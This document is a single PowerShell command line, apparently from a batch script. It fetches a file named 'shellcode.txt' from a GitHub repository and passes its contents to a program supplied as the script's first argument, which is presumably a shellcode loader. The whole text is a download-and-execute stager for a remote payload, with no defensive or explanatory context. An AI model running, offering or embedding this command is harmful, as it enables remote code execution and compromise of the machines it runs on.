powershell -Command "$data = (Invoke-WebRequest 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/shellcode.txt').Content; %1 $data"
